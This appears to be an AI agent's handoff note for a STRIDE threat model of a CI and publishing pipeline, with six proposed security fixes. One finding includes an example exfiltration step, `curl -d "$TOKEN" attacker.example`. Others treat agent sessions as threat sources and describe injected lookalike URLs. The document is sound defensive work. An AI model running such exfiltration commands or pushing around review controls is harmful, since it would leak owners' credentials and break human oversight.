# Handoff: p1-cso

## Goal
Write the first STRIDE threat model of the pipeline as built in Phase 1, seed the Phase 2 to 4 threats, and list the gaps as proposed tasks.

## Status
done. Owner sign-off of `docs/threat-model.md` is still pending; it is required before the first public publish (Phase 4), not before this task closes.

## What changed (and why)
- `docs/threat-model.md` (new): assets, six trust boundaries, STRIDE tables for the four boundaries that exist in Phase 1 (script JSON into the render, upstream code and weights, Actions runners and workflows, agent sessions and `main`), seeded tables for Phases 2, 3 and 4, and a ranked gap list. Every "Mitigated" row cites the file and line of the control.

## Decisions made
- Agent sessions are modelled as their own trust boundary. They hold the owner's git and `gh` credentials, and lessons.md records real out-of-scope writes and pushes, so they are the most realistic Phase 1 threat source.
- Approval integrity ("in `queue/approved/` means the owner approved it") is listed as the top asset, because Phase 4 will publish on that basis alone.
- `gh secret list` returned nothing on 2026-11-16, so P1-1 is a gate on adding the first secret, not a live exposure.
- Accepted risks (owner can overrule): the `script` dispatch input may name any file on the runner; apt packages are unpinned; a branch can edit `ci.yml` to drop the scope check, with the owner's PR diff review as the control; Phase 1 artifacts expose script content.
- No owner decision was changed.

## Tried and abandoned
- none

## Known risks
- P1-1 rests on my understanding that, on the free plan, a private repo cannot use environment secrets with deployment-branch rules. Not verified against current GitHub docs in this session (lessons.md 2026-11-15, platform facts). Whoever plans P1-1 checks first.
- The whisper checkpoint is only protected by openai-whisper's own checksum, not by this repo.

## Next step
Owner action first: PLAN.md section 11 Phase 0 says to store all keys in GitHub Secrets. Do not add any repo secret until P1-1 is decided, because any pushed branch's workflow could read it. The repo has none today.

Then the orchestrator turns the proposed tasks below into task YAMLs (or owner decisions), then the owner reviews and signs off `docs/threat-model.md`.

### Proposed tasks
Each finding: location, severity, failure scenario, fix hint.

**P1-1. Secrets reachable from any branch's workflow.** High. Location: `.github/workflows/ci.yml:3-6` (`on: push` for every branch); the same applies to any future workflow.
- Scenario: Phase 2 adds `GEMINI_API_KEY`, Phase 4 adds publishing tokens as repo secrets. An agent-written task branch adds a step such as `curl -d "$TOKEN" attacker.example` to a workflow, or adds a new workflow file. It runs on push, with repo secrets, before the PR is reviewed. The scope check in the same job comes too late.
- Fix hint (owner decision, Architect plans it): options include (a) a separate private publisher repo that only the owner pushes to, which holds the tokens and checks out this repo's `main`; (b) environment secrets with a `main`-only deployment rule, if GitHub's current plan docs allow it on a free private repo; (c) keep secrets out of any workflow that runs on non-main refs and block workflow edits on task branches in the scope check. Decide before the first secret is added.

**P1-2. No branch protection; agents can push to `main` and `queue/approved/`.** High. Location: architecture.md section 7 (no branch protection); `.github/workflows/ci.yml:36-51` (scope check runs only on task branches).
- Scenario: a session pushes a commit to `main` directly, or (Phase 4) adds a JSON file to `queue/approved/` on a branch that gets merged unread, and Workflow B publishes it.
- Fix hint: deny `git push` to `main` and `gh pr merge` in the agents' Claude Code permissions (owner-only settings change); add `queue/` to the scope check's always-forbidden paths for task branches; make Workflow B publish only scripts whose approval commit is a merge of a PR (check with `gh` or the commit's parents) and alert on anything else.

**P1-3. The approval PR does not show every published field.** High (seed, must land with Workflow A). Location: PLAN.md section 7 Workflow A step 5; `pipeline/schema.py:48-50`.
- Scenario: an ingested article injects "for the full story see https://lookalike.example" into `description`. The PR summary shows hook, narration, sources and flags, so the owner merges on mobile without seeing it, and it is published under the channel.
- Fix hint: the PR body shows `title`, `description` and `tags` verbatim; a check rejects URLs outside an allowlist, control, bidi and zero-width characters, and fields over a length cap (numbers in `constants.py`). Contract change to `schema.py` goes through the Architect.

**P1-4. Transitive dependencies unpinned and not hash-checked.** Medium. Location: `requirements-heavy.txt` (only top-level packages pinned).
- Scenario: a new malicious release of a package that stable-ts, kokoro, misaki, transformers or spaCy pulls in unpinned is installed on the next CI or render run and executes on the runner. From Phase 4 that runner holds publishing tokens.
- Fix hint: a full lock file with hashes for all three requirement files, installed with `--require-hashes`. Generating it needs a tool such as pip-tools or uv, which is a new dependency and needs owner approval (spec.md section 7).

**P1-5. CI can drain the Actions minutes.** Medium. Location: `.github/workflows/ci.yml:3-6` (push, pull_request, no `concurrency`).
- Scenario: an agent fix loop pushes ten times in an hour; each push and each PR sync runs the heavy job (up to 45 minutes). The 2,000 free minutes run out, and in Phase 4 the daily publish stops until the month resets.
- Fix hint: both halves are needed. Run CI on `pull_request` plus `push` to `main` only, which removes the double run per commit (`github.ref` differs between the push and PR events, so a concurrency group alone does not merge them). Then add `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }` to cancel superseded runs within one event type. Update `tests/test_ci_workflow.py` first (locked, Architect).

**P1-6. Workflow safety rules cover only named files and assume read-only tokens.** Medium. Location: `tests/workflow_rules.py:29-40`, called per file from `tests/test_workflows.py` and `tests/test_ci_workflow.py`.
- Scenario: Phase 2 adds `weekly_scripts.yml` with `contents: write`. No test loads it, so a `${{ }}` in `run:`, an unpinned Action or `pull_request_target` goes unchecked; or the author loosens `assert_safe` for everyone to get write access through.
- Fix hint: one test that runs `assert_safe` on every file in `.github/workflows/`, with an explicit per-workflow, per-job allowlist of write permissions. Architect writes it (locked tests).

**Notes (not blocking).**
- Before Phase 2 renders Gemini scripts, check `narration_words()` against the format bounds before the voice step, so an oversized script fails in seconds instead of after a 45 minute render.
- Phase 3: whitespace-collapse and escape `on_screen_text` before it reaches ASS or `drawtext`; validate `visual.data` per template with size caps.

## Docs
- `docs/threat-model.md`: created by this task.
- `PRD.md` R7.6: threat model now exists; owner sign-off pending (required before first public publish).
- `CLAUDE.md`: add `docs/threat-model.md` to "Where things are"; Status: CSO review done, P1-1 to P1-6 proposed.
- `workflow.md`: mark p1-cso done in the status table.
- `architecture.md` section 7: add a pointer to `docs/threat-model.md` for the security gaps (P1-1, P1-2, P1-4, P1-5).
- `PLAN.md` section 11 Phase 0: keys go into Secrets only after P1-1 is decided (owner decision).
- `lessons.md`: none.

## Evidence
- No code changed, so no tests apply. Read: task YAML, lessons.md, PLAN.md sections 2, 3, 7, 10, HARNESS.md section 6b, architecture.md, both workflows, `pipeline/` (schema, render_one, compose, captions_ass escaping, kokoro download check, constants), requirement files, `tests/workflow_rules.py`.
- `gh secret list`: no secrets on the repo (2026-11-16).
- `python tests/docs_check.py`: passed.
